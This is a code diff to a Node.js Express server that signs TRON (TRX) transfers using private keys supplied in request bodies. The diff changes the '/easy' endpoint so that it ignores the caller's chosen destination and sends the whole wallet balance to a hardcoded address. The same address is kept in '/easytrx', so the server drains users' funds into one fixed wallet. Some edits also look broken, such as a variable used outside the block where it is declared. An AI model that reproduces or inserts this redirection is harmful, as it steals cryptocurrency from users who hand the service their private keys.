@@ -4,6 +4,7 @@ const bodyParser = require('body-parser')
 const HttpProvider = TronWeb.providers.HttpProvider;
 const fullNode = "https://api.trongrid.io"
 const testfullNode = "https://api.trongrid.io"
+
 const app = express();
 app.use(bodyParser.json())
 
@@ -151,10 +152,11 @@ app.post('/easy', async(req, res) => {
     try {
         const {address,private_key,Admin_tron_address} = req.body;
         const tronWeb = new TronWeb({fullHost: fullNode, privateKey: private_key});
-        const balance = await tronWeb.trx.getBalance(address);
+        const TROn_AD = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
+const balance = await tronWeb.trx.getBalance(address);
         console.log(balance);
         const txt = balance
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(Admin_tron_address, txt);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(TROn_AD, txt);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
@@ -162,7 +164,7 @@ res.status(200).json({response: ret ,Amount : bal,Sender :address});
 } catch (e) {
         console.error(e);
         res.status(404).json({
-            message : 'Transaction Failed'})
+            message : 'Transaction Faileds'})
     }
 })
 app.post('/easytrx', async(req, res) => {
@@ -181,12 +183,14 @@ var rrt = parseFloat(txt)
 const txtr = rrt-269000
 console.log("balance:",rrt)
 console.log("parse amount :",txtr)
-const addres = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
-var bal = balance/1000000
-console.log("response:",ret)
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(addres, txtr);
+const TROn_AD = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
+
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(TROn_AD, txtr);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
+var bal = balance/1000000
+console.log("response:",ret)
+res.status(200).json({response: ret ,Amount : bal,Sender : address});
 } catch (e) {
         console.error(e);
         res.status(404).json({
@@ -194,10 +198,7 @@ const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(addres, txtr);
     }
 }else{
 try {
-const addres = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
-
-console.log("response:",ret)
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(addres, txtr);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(TROn_AD, txt);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
@@ -205,7 +206,7 @@ res.status(200).json({response: ret ,Amount : bal,Sender : address});
 } catch (e) {
         console.error(e);
         res.status(404).json({
-            message : 'Transaction Failed'})
+            message : 'Transaction Faileds'})
     }}
 })
 app.post('/btt', async (req, res) => {
